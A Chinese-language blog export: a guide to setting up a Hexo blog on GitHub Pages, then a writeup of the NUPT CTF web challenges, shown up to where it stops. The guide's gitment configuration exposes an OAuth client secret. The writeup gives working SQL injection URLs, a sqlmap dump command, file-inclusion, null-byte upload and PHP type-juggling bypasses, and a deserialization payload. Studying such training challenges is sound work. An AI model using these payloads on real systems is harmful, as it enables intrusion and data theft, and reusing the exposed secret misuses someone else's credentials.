    <content type="text"><![CDATA[利用GitHub page和hexo搭建一个个人博客主要分三步： 使用hexo在本地搭建一个可访问的博客。 自定义博客样式。 将博客发布到GitHub page。 hexo本地搭建可访问博客官方文档讲的很详细了。 #基于Windows 10 ; hexo: 3.3.9 ; next Release 5.0.0#1.安装 Node.js (https://nodejs.org/en/download/)#2.安装 Git for Windows (https://github.com/waylau/git-for-win)#3.安装 hexo# 打开cmd.exenpm install -g hexo-cli#4. 创建博客# 进入想要放博客文件的目录hexo init &lt;folder&gt;cd &lt;folder&gt;npm install# 到此为止已经可以看到效果# hexo clean;hexo g;hexo s [--debug]#5. 自选主题，如next (http://theme-next.iissnan.com/getting-started.html)cd themesgit clone https://github.com/iissnan/hexo-theme-next themes/next# 到此为止目录结构如下.├── _config.yml [站点配置文件]├── ...├── source| ├── _drafts| └── _posts└── themes ├──landscape └──next └──_config.yml [博客配置文件] 自定义博客样式blog/_config.ymlgit commit blog/themes/next/_config.ymlgit commit 版权声明 ，参考blog\themes\next\layout_macro\post-copyright.swig&lt;ul class="post-copyright"&gt; &lt;li class="post-copyright-title"&gt; &lt;strong&gt;&#123;&#123; __('post.copyright.title') + __('symbol.colon') &#125;&#125;&lt;/strong&gt; &lt;a href="&#123;&#123; post.permalink &#125;&#125;" &gt;&#123;&#123; post.title &#125;&#125;&lt;/a&gt; &lt;/li&gt; &lt;li class="post-copyright-author"&gt; &lt;strong&gt;&#123;&#123; __('post.copyright.author') + __('symbol.colon') &#125;&#125;&lt;/strong&gt; &lt;a href="&#123;&#123;config.url&#125;&#125;" title="&#123;&#123;__('post.copyright.welcome')&#125;&#125;"&gt; &#123;&#123; config.author &#125;&#125;&lt;/a&gt; &lt;/li&gt; &lt;li class="post-copyright-link"&gt; &lt;strong&gt;&#123;&#123; __('post.copyright.link') + __('symbol.colon') &#125;&#125;&lt;/strong&gt; &lt;a href="&#123;&#123; post.permalink &#125;&#125;" title="&#123;&#123; post.title &#125;&#125;"&gt;&#123;&#123; post.permalink &#125;&#125;&lt;/a&gt; &lt;/li&gt; &lt;li class="post-copyright-license"&gt; &lt;strong&gt;&#123;&#123; __('post.copyright.license_title') + __('symbol.colon') &#125;&#125; &lt;/strong&gt; &#123;&#123; __('post.copyright.license_content', theme.post_copyright.license_url, theme.post_copyright.license) &#125;&#125; &lt;/li&gt;&lt;/ul&gt; blog\themes\next\languages\zh-Hans.yml##部分post: copyright: title: 本文标题 author: 文章作者 link: 原始链接 license_title: 版权声明 welcome: '访问 findneo 的个人博客' license_content: 本文在&lt;i class="fa fa-creative-commons"&gt;&lt;/i&gt; &lt;a href="%s" rel="external nofollow" target="_blank"&gt;%s&lt;/a&gt;下发布。转载请保留原始链接。 文章模板 blog\scaffolds\post.md---title: &#123;&#123; title &#125;&#125;date: &#123;&#123; date &#125;&#125;categories: tags: [] ###可以直接用tags: [tag1,tag2]代替多行tagsdescription: ###当主题配置文件中的excerpt_description开启时，会把这一部分作为文章摘要--- 将博客发布到GitHub page网站内容发布官方文档 创建GitHub账户，新建username.github.io项目，为git配置sshnpm install hexo-deployer-git --savehexo d 开发内容与配置文件备份由于主题next本身是git项目，所以直接在blog文件夹内git init，然后整个blog文件夹(当然blog/.gitignore已经排除了没用的子文件夹)push到GitHub会发现next文件夹整个是空的。因此要做git库的嵌套处理，但比较麻烦，而且似乎不适用于这种情况。所以最后我采用在第一次push前把blog\themes\next\.git 重命名为 blog\themes\next\now-donot-use.git ，于是blog无法识别到next这个项目，成功地备份了所有配置。将来如果要更新主题，只需重命名回来，然后 git pull ，更新完改回去即可。 本地调试完成后，只需在git bash里执行./ok [&quot;you commit comment&quot;]即可完成部署和配置备份，ok文件内容如下： hexo cleanhexo dgit add -Aif [ "$1" = "" ]thengit commit -m "Update."elsegit commit -m "$1"figit push emmm,重装系统了从头开始，安装git fro windows，配置sshgit config --global user.name your_namegit config --global user.email your_mailssh-keygen -t rsa -b 4096 -C "your_email@example.com"clip &lt; ~/.ssh/id_rsa.pubssh -T git@github.com 验证ssh可用-------------------------------------在GitHub新建findneo.github.iogit clone https://github.com/findneo/findneo.github.io.gitcd findneo.github.iogit checkout -b bakeup 新建备份分支并设为默认分支，因为后面只手动操作这个分支，master分支由hexo-deployer-git自动操作 hexo init tmpcp -a tmp/* ./rm -rf tmpnpm install --save hexo-deployer-gitnpm install --save hexo-generator-baidu-sitemapnpm install --save hexo-generator-sitemapnpm install --save hexo-generator-searchdbnpm install --save hexo-generator-feed npm i --save hexo-wordcount------------------------------------- 在站点配置文件中配置git-deployer为master分支git add . git commit -m "..." git push origin bakeuphexo d -g 参考了这位朋友的备份方法，很棒，(๑•̀ㅂ•́)و✧。 列个软件清单： WSL、everything、 Typora 、shadow socks、chrome、firefox、notepad++ 、一键上网脚本、 sublime、印象笔记、python2/3、git for windows、vmware/kali/win7、AgentRansack、7z、射手影音、SumatraPDF、微软办公系列 WPS Office 2013 个人版 、IObitUninstaller、snipaste burpsuite、fiddler、wireshark、nmap、sqlmap、winhex、ziperello、weevely、winhex、御剑、awvs 添加gitment作为评论系统项目介绍:https://imsun.net/posts/gitment-introduction/ 在 findneo.github.io\themes\next\layout_partials\comments.swig 的倒数第二个endif前添加 &#123;% elseif config.gitment.owner and config.gitment.commentrepo and config.gitment.clientid and config.gitment.clientsecret %&#125; &lt;div id="gitmentContainer"&gt;&lt;/div&gt; &lt;link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"&gt; &lt;script src="https://imsun.github.io/gitment/dist/gitment.browser.js"&gt;&lt;/script&gt; &lt;script type="text/javascript"&gt; var gitment = new Gitment(&#123; id: '&#123;&#123;page.title&#125;&#125;', owner: '&#123;&#123;config.gitment.owner&#125;&#125;', repo: '&#123;&#123;config.gitment.commentrepo&#125;&#125;', oauth: &#123; client_id: '&#123;&#123;config.gitment.clientid&#125;&#125;', client_secret: '&#123;&#123;config.gitment.clientsecret&#125;&#125;', &#125;, &#125;) gitment.render('gitmentContainer') &lt;/script&gt; 然后在站点配置文件末尾添加 gitment: owner: findneo commentrepo: findneo.github.io clientid: a3407310dfbeafbfe55a clientsecret: ad6c900a0fce4a44b8eeb40e1790ee7c7cc7575d 需要注意的是每发布一篇文章都需要把该页面初始化一下其他人才可以评论，这是因为评论基于issue，并不是bug 单独控制每篇文章版权声明给 themes\next\layout\_macro\post-copyright.swig 加上控制流程，通过每个post的 front-matter控制，遇到想不加版权声明的文章就在头部加上 notoriginal: true 即可，不影响已有文章。 &#123;% if not post.notoriginal %&#125;foo&#123;% endif %&#125;]]></content>
      <categories>
        <category>备忘</category>
      </categories>
      <tags>
        <tag>hacklife</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[南京邮电大学网络攻防训练平台writeup]]></title>
    <url>%2F2017%2F09%2Fnupt-ctf-writeup%2F</url>
    <content type="text"><![CDATA[南邮CTF平台网址： http://ctf.nuptsast.com/challenges http://ctf.nuptzj.cn/challenges WEB签到题nctf{flag_admiaanaaaaaaaaaaa} ctrl+u或右键查看源代码即可。在CTF比赛中，代码注释、页面隐藏元素、超链接指向的其他页面、HTTP响应头部都可能隐藏flag或提示信息。在渗透测试中，开发者留下的多余注释和测试页面有时也能提供线索。 md5 collisionnctf{md5_collision_is_easy} &lt;?php$md51 = md5('QNKCDZO');$a = @$_GET['a'];$md52 = @md5($a);if(isset($a))&#123;if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123; echo "nctf&#123;*****************&#125;";&#125; else &#123; echo "false!!!";&#125;&#125;else&#123;echo "please input a";&#125;?&gt; 利用PHP弱类型，前人发现md5(‘QNKCDZO’)=’0e830400451993494058024219903391’，md5(‘240610708’)=’0e462097431906509019562988736854’，而因为使用松散比较的缘故，var_dump(‘0e830400451993494058024219903391’==’0e462097431906509019562988736854’);值为真，因此访问 http://chinalover.sinaapp.com/web19/?a=240610708 即可。 1、在PHP中，@被称为错误控制操作符(error control operator)，前置@符号的表达式产生的任何错误都将被忽略。 2、1992年发布的MD5算法是一种广泛使用的哈希算法，最初被设计用来作为加密算法，在被证明不安全后只能用来做数据完整性校验。MD5算法为消息产生128位摘要，常表示为32位十六进制串，由[0-9a-e]组成。 3、PHP的比较操作符主要有两类——松散比较和严格比较，于是就有了equal(==)和Identical(===)两种相等，主要区别在于前者会在比较前根据上下文对操作数进行类型转换(type juggling)而后者不会。这种juggle总的来说利大于弊，但确实容易玩脱。 ​ 此处只谈涉及字符串和数值的松散比较。根据本地实验结合官方文档，我们可以总结出来，这种类型转换的行为关键在于两点，一是判断字符串是否处于数字语境(in a numeric context)，二是如何为处于数字语境的字符串取值。 ​ 当操作符为==时，若有一个操作数为int/float或两个操作数is_numeric()均为真，则判断为处于数字语境；当操作符为数字操作符，如+-/*时，则判断为处于数字语境。（此段为实验支持下的个人猜测，未找到依据。） ​ 根据PHP官方文档 ，如果一个字符串被认定处于数字语境，那么它的取值取决于字符串的前面一部分，如果字符串以有效的数字型数据【Valid numeric data ，正则匹配表达为 \s(\d+\.?\d*|\.\d+)([eE]\d+)?\s，含有[eE]的视为科学计数法】开头，那么字符串取开头部分的数值，否则取0 。实验发现1e也被取值为1而不是0，这有点奇怪 :( &lt;?php $a1=1; $b1="1"; $c1="1padding"; $a2=.1; $b2=".1"; $c2=".1padding"; $a3=1.; $b3="1."; $c3="1.padding"; $a4=1.1; $b4="1.1"; $c4="1.1padding"; $a5=1.e1; $b5="1.e1"; $c5="1.e1padding"; $a6=.1e1; $b6=".1e1"; $c6=".1e1padding"; $a7=1.1e1; $b7="1.1e1"; $c7="1.1e1padding"; $a8=1e1; $b8="1e1"; $c8="1e1padding"; var_dump($a8==$b8);//true var_dump($a8==$c8);//true var_dump($b8==$c8);//false var_dump($a8+$b8);//float(20) var_dump($a8+$c8);//float(20) var_dump($b8+$c8);//float(20) 4、其他符合/0[eE]\d{30}/的MD5值： string(strlen($var)) $var string(strlen(md5($var))) md5($var) QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s1502113478a 0e861580163291561247404381396064 s214587387a 0e848240448830537924465865611904 s878926199a 0e545993274517709034328855841020 s1091221200a 0e940624217856561557816327384675 s1885207154a 0e509367213418206700842008763514 s1836677006a 0e481036490867661113260034900752 s1184209335a 0e072485820392773389523109082030 s1665632922a 0e731198061491163073197128363787 s532378020a 0e220463095855511507588041205815 240610708 0e462097431906509019562988736854 签到2&lt;html&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;尚未登录或口令错误&lt;form action="./index.php" method="post"&gt; &lt;p&gt;输入框：&lt;input type="password" value="" name="text1" maxlength="10"&gt;&lt;br&gt; 请输入口令：zhimakaimen &lt;input type="submit" value="开门"&gt;&lt;/form&gt;&lt;/html&gt; nctf{follow_me_to_exploit} maxlength=”10” 而口令 zhimakaimen 有11位，数据在前端就会被截断掉。这时有两种做法，一种是在chrome/Firefox浏览器的开发者工具中将 maxlength=”10” 字段修改为 maxlength=”11” 或是更大的值；另一种是使用hackbar或burp直接向 http://teamxlc.sinaapp.com/web1/02298884f0724c04293b4d8c0178615e/index.php post text1=zhimakaimen 。客户端的行为都是可控的，所以熟悉HTML和JavaScript是重要的。 这题不是WEBnctf{photo_can_also_hid3_msg} 下载图片并用winhex打开，在末尾发现字符串。一个简单的隐写。 层层递进nctf{this_is_a_fl4g} 查看源代码，跟随链接，依次访问SO.html -&gt; S0.html-&gt;SO.htm -&gt;S0.htm-&gt;404.html ，在最后一个页面里的注释部分可找到flag。还是查看源代码，细心就会发现异常。 AAencodenctf{javascript_aaencode} aaencode是一种把js代码编码成日语颜文字的编码方式，使用Unicode编码查看，然后 在线解码 。工具作者颇有幽默感。 单身二十年nctf{yougotit_script_now} 访问 http://chinalover.sinaapp.com/web8/search_key.php 会被重定向到 http://chinalover.sinaapp.com/web8/no_key_is_here_forever.php ，重定向会被浏览器自动处理，burp抓包则可见flag。 你从哪里来 你是从 google 来的吗？传送门：题目地址 nctf{http_referer} 给请求加上referer: https://www.google.com即可。从https://github.com/otakekumi/NUPT_Challenges/blob/master/WEB/%E4%BD%A0%E4%BB%8E%E5%93%AA%E9%87%8C%E6%9D%A5/index.php 看到源代码可能有点问题。 &lt;?php$referer = $_SERVER['referer'];if ($referer === "https://www.google.com/ " || $referer === "https://www.google.com")&#123; echo "nctf&#123;http_referer&#125;";&#125;else&#123; echo "are you from google?";&#125;?&gt; 第二行应该是$referer = $_SERVER[&#39;HTTP_REFERER&#39;]; ？ php decode&lt;?phpfunction CLsI($ZzvSWE) &#123; $ZzvSWE = gzinflate(base64_decode($ZzvSWE)); for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123; $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1); &#125; return $ZzvSWE;&#125;echo CLsI("+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA=="); nctf{gzip_base64_hhhhhh} 运行代码即可。 文件包含nctf{edulcni_elif_lacol_si_siht} 使用PHP的filter协议读取index.php，即访问 http://4.chinalover.sinaapp.com/web7/index.php?file=php://filter/convert.base64-encode/resource=index.php ，将得到的字符串base64解码。 单身一百年也没用nctf{this_is302redirect} flag藏在响应头中。 Download~!nctf{download_any_file_666} 访问 http://way.nuptzj.cn/web6/download.php?url=base64-of-file-name 可以下载允许下载的任意文件，所以先下载download.php，得到白名单列表里有hereiskey.php，再下载下来就可见flag。 COOKIEnctf{cookie_is_different_from_session} 看到响应头中有Set-Cookie: Login=0，因此在请求头加入Cookie: Login=1即可。 MYSQLnctf{query_in_mysql} 根据提示查看robots.txt，内容如下 TIP:sql.php&lt;?phpif($_GET[id]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query("select content from ctf2 where id='$id'")); if ($_GET[id]==1024) &#123; echo "&lt;p&gt;no! try again&lt;/p&gt;"; &#125; else&#123; echo($query[content]); &#125;&#125;?&gt; 说明要向sql.php提交一个id，使得intval($_GET[id])为1024而$_GET[id]==1024为假。intval识别到非数字的那一位，而松散比较前的强制类型转换会把e当作科学计数法的一部分处理，所以可以提交id=1024e1等，如访问http://chinalover.sinaapp.com/web11/sql.php?id=1024e1。 1、robots.txt可能藏有提示 2、int intval ( mixed $var [, int $base = 10 ] )只取/\d*/的部分。 sql injection 3nctf{gbk_3sqli} 分别访问id=2和id=3得到提示gbk_sql_injection和the fourth table，所以是存在宽字节注入，flag在第四个表里面。上sqlmap跑一跑，最后一步是这样： python sqlmap.py -u &quot;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%d6&apos;&quot; -T ctf4 -C flag --dump 也可以手注： 步骤一：确认该点存在注入http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2 和http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6%27--+ 返回结果相同。由于MySQL执行查询时会跳过畸形字符，而 id=2%d6%27--+ 经过转义变为id=2%d6%5c%27--+ ，其中%d6%5c被合在一起解释，也就是id = '2Ö'-- 效果等价于 id = '2'--，但我们获得了执行sql的机会。 步骤二：查询数据库名发现支持union查询 ，http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6%27+and+0+union+select+null,database()--+ ，之所以要加and+0+是因为显示点只有一处，必须让原来的查询失败。得到数据库名为'sae-chinalover'。 步骤三：查询名为’sae-chinalover’的数据库的表的数量和名字http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6'+and+0+union+select+null,count(*)+from+information_schema.tables+where+table_schema=database()--+得到目前的数据库含有5张表http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6'+and+0+union+select+null,table_name+from+information_schema.tables+where+table_schema=database()+limit+3,1--+得到第四张表表名为'ctf4'MySQL的information_schema数据库包含所有数据库的元信息，其中的tables表包含其他数据库的数据库名、表名、表类型、创建时间等许多信息，其中table_schema列为数据库名，table_name列为表名。因为能显示出来的记录有限，所以必须用limit来控制要显示第几条记录，否则只能显示第一条。limit用法是这样LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;，必须放在where后面。 步骤四：查询表’ctf4’中的flaghttp://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6'+and+0+union+select+null,count(*)+from+ctf4--+发现该表只有一条记录http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6'+and+0+union+select+null,flag+from+ctf4--+猜测列名为flag，查询得到flag 附一个select查询语法 SELECT [ALL | DISTINCT | DISTINCTROW ] [HIGH_PRIORITY] [STRAIGHT_JOIN] [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] select_expr [, select_expr ...] [FROM table_references [PARTITION partition_list] [WHERE where_condition] [GROUP BY &#123;col_name | expr | position&#125; [ASC | DESC], ... [WITH ROLLUP]] [HAVING where_condition] [ORDER BY &#123;col_name | expr | position&#125; [ASC | DESC], ...] [LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;] [PROCEDURE procedure_name(argument_list)] [INTO OUTFILE 'file_name' [CHARACTER SET charset_name] export_options | INTO DUMPFILE 'file_name' | INTO var_name [, var_name]] [FOR UPDATE | LOCK IN SHARE MODE]] /x00nctf{use00to_jieduan} 访问得到源码 if (isset ($_GET['nctf'])) &#123; if (@ereg ("^[1-9]+$", $_GET['nctf']) === FALSE) echo '必须输入数字才行'; else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE) die('Flag: '.$flag); else echo '骚年，继续努力吧啊~'; &#125; 要求提交的nctf的值符合正则匹配(一个或多个数字)并且能被strpos找到#biubiubiu ，根据提示查到资料ereg会把null视为字符串的结束，从而被%00截断，而strpos则可以越过%00，所以提交nctf=1%00%23biubiubiu即可。 参考资料 由于在PHP中string的实现本质上是一个以字节为单位的数组加上一个声明缓冲区长度的整形，因此string类型可以由任何值构成，即使是“NUL bytes”，但PHP中有些底层库（比如C语言相关的，因为C语言中\0标识字符串的结束）会忽略”a NUL byte”后面的数据，使用了这些库的函数就是非二进制安全的(non-binary-safe)，ereg就是一个例子。闲着无聊搜了一下发现还有这么一些函数： int strcoll ( string $str1 , string $str2 )Locale based string comparison (when current locale is not C or POSIX) public array TokyoTyrantTable::get ( mixed $keys )Gets a row from table database. (version&gt;0.3.0) public Exception::__construct ([ string $message = “” [, int $code = 0 [, Throwable $previous = NULL ]]] )Construct the exception 。其中对message的处理是非二进制安全的。 public Error::__construct ([ string $message = “” [, int $code = 0 [, Throwable $previous = NULL ]]] )Construct the error object 。其中对message的处理是非二进制安全的。 bool error_log ( string $message [, int $message_type = 0 [, string $destination [, string $extra_headers ]]] )Sends an error message to the web server’s error log or to a file.。其中对message的处理是非二进制安全的。(error_log() is not binary safe. message will be truncated by null character.) bool radius_put_string ( resource $radius_handle , int $type , string $value [, int $options = 0 [, int $tag ]] )Attaches a string attribute。 其中$value值基于会被null截断的底层库，是非二进制安全的。 bool radius_put_vendor_string ( resource $radius_handle , int $vendor , int $type , string $value [, int $options = 0 [, int $tag ]] )Attaches a vendor specific string attribute 。$value是非二进制安全的。 string addcslashes ( string $str , string $charlist ) （存疑，似乎并不是）Quote string with slashes in a C style. Returns a string with backslashes before characters that are listed in charlist parameter. array gzfile ( string $filename [, int $use_include_path = 0 ] ) （存疑，待验证）Read entire gz-file into an array 还有这些 &lt;?php$s=$_REQUEST['a']; // http://localhost/test.php?a=asd%00asdf$p='asdf';var_dump(ereg_replace($p,'abcc',$s)); //string(3) "asd" var_dump(eregi_replace($p,'abcc',$s));//string(3) "asd" var_dump(ereg($p,$s));//bool(false) var_dump(eregi($p,$s));//bool(false) var_dump(split($p,$s));//array(1) &#123; [0]=&gt; string(8) "asd\0asdf" &#125; var_dump(split($p,$s));//array(1) &#123; [0]=&gt; string(8) "asd\0asdf" &#125; var_dump(sql_regcase($s)); //看起来没问题啊。。。string(29) "[Aa][Ss][Dd]\0[Aa][Ss][Dd][Ff]" // ereg_replace — Replace regular expression// ereg — Regular expression match// eregi_replace — Replace regular expression case insensitive// eregi — Case insensitive regular expression match// split — Split string into array by regular expression// spliti — Split string into array by regular expression case insensitive// sql_regcase — Make regular expression for case insensitive match bypass againnctf{php_is_so_cool} 访问得到源码 if (isset($_GET['a']) and isset($_GET['b'])) &#123;if ($_GET['a'] != $_GET['b'])if (md5($_GET['a']) === md5($_GET['b']))die('Flag: '.$flag);elseprint 'Wrong.';&#125; 源码要求提交两个不相等的值使他们的md5值严格相等。md5()函数要求接收一个字符串，若传递进去一个数组，则会返回null，即var_dump(md5(array(2))===null);值为bool(true) ，因此向$_GET数组传入两个名为a、b的不相等的数组，从而导致md5()均返回空，于是得到flag，如访问 http://chinalover.sinaapp.com/web17/index.php?a[]=&amp;b[]=1 变量覆盖nctf{bian_liang_fu_gai!} source.php核心代码如下 &lt;?php if ($_SERVER["REQUEST_METHOD"] == "POST") &#123; extract($_POST); if ($pass == $thepassword_123) echo $theflag; &#125; extract()函数原型为int extract(array &amp;$var_array [,int $extract_type=EXTR_OVERWRITE [,string $prefix = NULL]]) ，从数组中将变量导入当前符号表，$extract_type缺省值为1，若没有另外指定，函数将覆盖已有变量，故传入任意pass和与之相等的thepassword_123即可。其实我们甚至可以覆盖theflag变量，但是那样就拿不到真正的flag了 :D。source.php包含源码。 PHP是世界上最好的语言nctf{php_is_best_language} index.txt核心代码如下 &lt;?phpif(eregi("hackerDJ",$_GET[id])) &#123; echo("&lt;p&gt;not allowed!&lt;/p&gt;"); exit();&#125;$_GET[id] = urldecode($_GET[id]);if($_GET[id] == "hackerDJ")&#123; echo "&lt;p&gt;Access granted!&lt;/p&gt;"; echo "&lt;p&gt;flag: *****************&#125; &lt;/p&gt;";&#125; 网页会拒绝任何含有hackerDJ的提交(忽略大小写)，但接受urldecode后为hackerDJ的字符串，所以按照对照表编码，并将%编码为%25后提交，自动解码一次后%25变为%,代码中再解码一次后便得到flag。即访问 http://way.nuptzj.cn/php/index.php?id=%2568%2561%2563%256b%2565%2572%2544%254a 这是个二次编码的问题。 伪装者 这是一个到处都有着伪装的世界题目地址：点我 nctf{happy_http_headers} referer改了没用，据说请求头添加X-Forwarded-For: 127.0.0.1即可，没有成功，怀疑服务端代码有问题，可能是和你从哪里来那题一样的问题。XFF头用以标志客户端真实IP，常用在使用HTTP 代理或者负载均衡服务时。 headernctf{tips_often_hide_here} 使用chrome浏览器的开发者工具可以看到相应数据包的头部有flag字段，其值即flag。 上传绕过 题目地址：猜猜代码怎么写的 nctf{welcome_to_hacks_world} 当filename为1.jpg时返回如下: Array( [0] =&gt; .jpg [1] =&gt; jpg)Upload: 1.jpg&lt;br /&gt;Type: text/plain&lt;br /&gt;Size: 0.0078125 Kb&lt;br /&gt;Stored in: ./uploads/8a9e5f6a7a789acb.phparray(4) &#123; ["dirname"]=&gt; string(9) "./uploads" ["basename"]=&gt; string(5) "1.jpg" ["extension"]=&gt; string(3) "jpg" ["filename"]=&gt; string(1) "1"&#125;&lt;br&gt;必须上传成后缀名为php的文件才行啊！&lt;br&gt;&lt;/body&gt; 当filename为1.php时返回如下： Array( [0] =&gt; .php [1] =&gt; php)不被允许的文件类型,仅支持上传jpg,gif,png后缀的文件 观察源码为： 文件上传&lt;br&gt;&lt;br&gt;&lt;form action="upload.php" method="post"enctype="multipart/form-data"&gt;&lt;label for="file"&gt;Filename:&lt;/label&gt;&lt;input type="hidden" name="dir" value="/uploads/" /&gt;&lt;input type="file" name="file" id="file" /&gt; &lt;br /&gt;&lt;input type="submit" name="submit" value="Submit" /&gt;&lt;/form&gt; 因为最后应该是dir和file连接，所以可以通过修改隐藏元素dir的value来实现截断上传。即抓包后修改 /uploads/为/uploads/1.php0x00，然后file保持1.jpg，连起来后就是/uploads/1.php%001.jpg，则既绕过了白名单验证又上传了PHP后缀的文件。（0x00是指修改16进制值，不可见。） sql注入1 听说你也会注入？地址： 题目地址 nctf{ni_ye_hui_sql?} 在 http://chinalover.sinaapp.com/index.phps 查看源码，核心部分如下： &lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql="select user from ctf where (user='".$user."') and (pw='".$pass."')"; echo '&lt;/br&gt;'.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]=="admin") &#123; echo "&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;"; &#125; if($query[user] != "admin") &#123; echo("&lt;p&gt;You are not admin!&lt;/p&gt;"); &#125;&#125;echo $query[user]; 会对传入参数两端去空格，然后sql拼接如下 $sql=&quot;select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)&quot;; ， 所以只要用构造一下user的值，使语法无误，然后注释掉后面的即可。MySQL主要有三种注释方式#注释到行尾，/*bla*/用于行间或多行注释，--也是注释到行尾，但需要注意的是在两个减号后面至少要有一个\s，也就是空格，TAB，换行符等。 所以本题可post user=admin&#39;)-- -&amp;pass=123或user=admin&#39;)#&amp;pass=123， sql语句就变成select user from ctf where (user=&#39;admin&#39;)#&#39; and (pw=&#39;123&#39;), 查询语句就能成功返回user列，值为admin的那条记录。 pass checknctf{strcmp_is_n0t_3afe} &lt;?php$pass=@$_POST['pass'];$pass1=***********;//被隐藏起来的密码if(isset($pass))&#123;if(@!strcmp($pass,$pass1))&#123;echo "flag:nctf&#123;*&#125;";&#125;else&#123;echo "the pass is wrong!";&#125;&#125;else&#123;echo "please input pass!";&#125;?&gt; 考察PHP弱类型，从PHP社区文档的注解可以发现strcmp函数在比较失败，即传入数组，时会返回null。(还有一个比较有意思的是当有一个字符串长度为0时，返回的是相互比较的两个字符串长度的差值。)所以post的数据为pass[]= 起名字真难nctf{follow_your_dream} &gt; &lt;?php&gt; function noother_says_correct($number)&gt; &#123;&gt; $one = ord('1');&gt; $nine = ord('9');&gt; for ($i = 0; $i &lt; strlen($number); $i++)&gt; &#123; &gt; $digit = ord($number&#123;$i&#125;);&gt; if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )&gt; &#123;&gt; return false;&gt; &#125;&gt; &#125;&gt; return $number == '54975581388';&gt; &#125;&gt; $flag='*******';&gt; if(noother_says_correct($_GET['key']))&gt; echo $flag;&gt; else &gt; echo 'access denied';&gt; ?&gt;&gt; 要求传入key不包含[1-9]，但又等于54975581388，考虑转十六进制，发现54975581388=0xccccccccc， 因此访问 http://chinalover.sinaapp.com/web12/index.php?key=0xccccccccc 密码重置 重置管理员账号：admin 的密码 你在点击忘记密码之后 你的邮箱收到了这么一封重置密码的邮件： 点击此链接重置您的密码 nctf{reset_password_often_have_vuln 修改重置链接的URL和POST中对应参数为admin相关的即可。 即向 http://nctf.nuptzj.cn/web13/index.php?user1=YWRtaW4%3D post user=admin&amp;newpass=aaaaa&amp;vcode=1234 。 php反序列化 &gt; &lt;?php&gt; class just4fun &#123;&gt; var $enter;&gt; var $secret;&gt; &#125;&gt; if (isset($_GET['pass'])) &#123;&gt; $pass = $_GET['pass'];&gt; if(get_magic_quotes_gpc())&#123;&gt; $pass=stripslashes($pass);&gt; &#125;&gt; $o = unserialize($pass);&gt; if ($o) &#123;&gt; $o-&gt;secret = "*";&gt; if ($o-&gt;secret === $o-&gt;enter)&gt; echo "Congratulation! Here is my secret: ".$o-&gt;secret;&gt; else &gt; echo "Oh no... You can't fool me";&gt; &#125;&gt; else echo "are you trolling?";&gt; &#125;&gt; 链接失效，本地搭建环境实验。反序列化后的secret成员被赋予未知的值却要求另一成员enter其值与之相同， 从官方文档看到这么一句 Circular references inside the array/object you are serializing will also be stored， 说明对象包含的引用在序列化时也会被存储，所以如果enter指向secret的引用，两个成员的值就可以同步变化了。 &lt;?phpclass just4fun&#123; var $secret; var $enter ;&#125;$f=new just4fun();$f-&gt;enter=&amp;$f-&gt;secret;$sf=serialize($f);print_r($sf);$usf=unserialize($sf);echo '&lt;br/&gt;';print_r($usf); 输出如下 O:8:”just4fun”:2:{s:6:”secret”;N;s:5:”enter”;R:2;}just4fun Object ( [secret] =&gt; [enter] =&gt; ) 访问 http://127.0.0.1/nanyou.php?pass=O:8:%22just4fun%22:2:{s:6:%22secret%22;N;s:5:%22enter%22;R:2;} 验证成功。 别处看到flag为nctf{serialize_and_unserialize} sql injection4 继续注入吧~题目地址 TIP:反斜杠可以用来转义仔细查看相关函数的用法 nctf{sql_injection_is_interesting} 页面源代码注释中有SQL构造方式： #GOAL: login as admin,then get the flag;error_reporting(0);require 'db.inc.php';function clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES);&#125;$username = @clean((string)$_GET['username']);$password = @clean((string)$_GET['password']);$query='SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';';$result=mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1)&#123; die('Invalid password!');&#125;echo $flag; 核心函数是htmlentities($str, ENT_QUOTES) ，函数原型是这样 string htmlentities ( string $string [, int $flags = ENT_COMPAT | ENT_HTML401 [, string $encoding = ini_get("default_charset") [, bool $double_encode = true ]]] ) 参数flags缺省情况下与$flags=ENT_QUOTES情况下函数行为不同， 选值为ENT_QUOTES时Will convert both double and single quotes， 也就是说，前者不会将单引号编码而后者会。我们的最终目标是平衡引号，从而使查询语句语法正确，既然无法输入单引号，就消灭单引号。 